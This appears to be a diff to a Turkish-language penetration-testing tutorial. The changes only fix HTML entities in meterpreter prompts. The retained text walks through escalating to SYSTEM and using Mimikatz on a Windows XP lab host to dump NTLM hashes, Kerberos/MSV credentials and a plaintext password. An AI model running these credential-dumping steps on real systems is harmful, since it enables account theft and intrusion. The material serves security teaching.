@@ -38,7 +38,7 @@ Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırı
 
 
 ```bash
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: WINXP-E95CE571A1\Administrator
 ```
 
@@ -48,10 +48,10 @@ Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir
 
 
 ```bash
-meterpreter **&gt;** getsystem
+meterpreter **>** getsystem
 ...got system **(**via technique 1**)**.
 
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
@@ -65,7 +65,7 @@ Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYS
 
 
 ```bash
-meterpreter **&gt;** sysinfo
+meterpreter **>** sysinfo
 Computer        : WINXP-E95CE571A1
 OS              : Windows XP **(**Build 2600, Service Pack 3**)**.
 Architecture    : x86
@@ -79,7 +79,7 @@ Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu gö
 
 
 ```bash
-meterpreter **&gt;** load mimikatz
+meterpreter **>** load mimikatz
 Loading extension mimikatz...success.
 ```
 
@@ -89,7 +89,7 @@ Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görünt
 
 
 ```bash
-meterpreter **&gt;** help mimikatz
+meterpreter **>** help mimikatz
 
 Mimikatz Commands
 **=================**
@@ -115,7 +115,7 @@ Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içler
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f version
+meterpreter **>** mimikatz_command -f version
 mimikatz 1.0 x86 **(**RC**)** **(**Nov  7 2013 08:21:02**)**
 ```
 
@@ -129,7 +129,7 @@ Aşağıdaki örnekte, `fu::` modülü istenmiştir. Böyle bir modül olmadığ
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f fu::
+meterpreter **>** mimikatz_command -f fu::
 Module : 'fu' introuvable
 
 Modules disponibles : 
@@ -160,7 +160,7 @@ Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için m
 
 
 ```bash
-meterpreter &gt; mimikatz_command -f divers::
+meterpreter > mimikatz_command -f divers::
 Module : 'divers' identifié, mais commande '' introuvable
 
 Description du module : Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
@@ -188,7 +188,7 @@ RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framewor
 
 
 ```bash
-meterpreter &gt; msv
+meterpreter > msv
 [+] Running as SYSTEM
 [*] Retrieving msv credentials
 msv credentials
@@ -202,7 +202,7 @@ AuthID   Package    Domain           User              Password
 0;56683  NTLM                                          n.s. (Credentials KO)
 0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  n.s. (Credentials KO)
 
-meterpreter &gt; kerberos
+meterpreter > kerberos
 [+] Running as SYSTEM
 [*] Retrieving kerberos credentials
 kerberos credentials
@@ -223,7 +223,7 @@ AuthID   Package    Domain           User              Password
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f samdump::hashes
+meterpreter **>** mimikatz_command -f samdump::hashes
 Ordinateur : winxp-e95ce571a1
 BootKey    : 553d8c1349162121e2a5d3d0f571db7f
 
@@ -247,7 +247,7 @@ User : SUPPORT_388945a0
 LM   : 
 NTLM : 771ee1fce7225b28f8aec4a88aea9b6a
 
-meterpreter **&gt;** mimikatz_command -f sekurlsa::searchPasswords
+meterpreter **>** mimikatz_command -f sekurlsa::searchPasswords
 **[**0] **{** Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword **}**
 ```
 
@@ -265,7 +265,7 @@ Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bul
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f handle::
+meterpreter **>** mimikatz_command -f handle::
 Module : 'handle' identifié, mais commande '' introuvable
 
 Description du module : Manipulation des handles
@@ -275,20 +275,20 @@ tokenImpersonate  - Essaye d'impersonaliser un token en utilisant d'autres handl
 nullAcl           - Positionne une ACL null sur des Handles
 
 
-meterpreter &gt; mimikatz_command -f handle::list
+meterpreter > mimikatz_command -f handle::list
 ...snip...
-  760  lsass.exe                 -&gt;  1004       Token           NT AUTHORITY ETWORK SERVICE
-  760  lsass.exe                 -&gt;  1008       Process 704     winlogon.exe
-  760  lsass.exe                 -&gt;  1052       Process 980     svchost.exe
-  760  lsass.exe                 -&gt;  1072       Process 2664    fubar.exe
-  760  lsass.exe                 -&gt;  1084       Token           NT AUTHORITY\LOCAL SERVICE
-  760  lsass.exe                 -&gt;  1096       Process 704     winlogon.exe
-  760  lsass.exe                 -&gt;  1264       Process 1124    svchost.exe
-  760  lsass.exe                 -&gt;  1272       Token           NT AUTHORITY\ANONYMOUS LOGON
-  760  lsass.exe                 -&gt;  1276       Process 1804    psia.exe
-  760  lsass.exe                 -&gt;  1352       Process 480     jusched.exe
-  760  lsass.exe                 -&gt;  1360       Process 2056    TPAutoConnSvc.exe
-  760  lsass.exe                 -&gt;  1424       Token           WINXP-E95CE571A1\Administrator
+  760  lsass.exe                 ->  1004       Token           NT AUTHORITY ETWORK SERVICE
+  760  lsass.exe                 ->  1008       Process 704     winlogon.exe
+  760  lsass.exe                 ->  1052       Process 980     svchost.exe
+  760  lsass.exe                 ->  1072       Process 2664    fubar.exe
+  760  lsass.exe                 ->  1084       Token           NT AUTHORITY\LOCAL SERVICE
+  760  lsass.exe                 ->  1096       Process 704     winlogon.exe
+  760  lsass.exe                 ->  1264       Process 1124    svchost.exe
+  760  lsass.exe                 ->  1272       Token           NT AUTHORITY\ANONYMOUS LOGON
+  760  lsass.exe                 ->  1276       Process 1804    psia.exe
+  760  lsass.exe                 ->  1352       Process 480     jusched.exe
+  760  lsass.exe                 ->  1360       Process 2056    TPAutoConnSvc.exe
+  760  lsass.exe                 ->  1424       Token           WINXP-E95CE571A1\Administrator
 ...snip...
 ```
 
@@ -302,7 +302,7 @@ Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağl
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f service::
+meterpreter **>** mimikatz_command -f service::
 Module : 'service' identifié, mais commande '' introuvable
 
 Description du module : Manipulation des services
@@ -319,7 +319,7 @@ Bu seçeneklerden, listeleme modülünü kullanalım.
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f service::list
+meterpreter **>** mimikatz_command -f service::list
 ...snip...
         WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
         KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device **(**RFCOMM Protocol TDI**)**
@@ -346,7 +346,7 @@ Mimikatz’ın sağladığı kripto modülüne ve seçeneklerine bakalım.
 
 
 ```bash
-meterpreter **&gt;** mimikatz_command -f crypto::
+meterpreter **>** mimikatz_command -f crypto::
 Module : 'crypto' identifié, mais commande '' introuvable
 
 Description du module : Cryptographie et certificats
@@ -366,7 +366,7 @@ Bu seçeneklerden `listProviders` seçeneğini kullanalım.
 
 
 ```bash
-meterpreter &gt; mimikatz_command -f crypto::listProviders
+meterpreter > mimikatz_command -f crypto::listProviders
 Providers CryptoAPI :
         Gemplus GemSAFE Card CSP v1.0
         Infineon SICRYPT Base Smart Card CSP
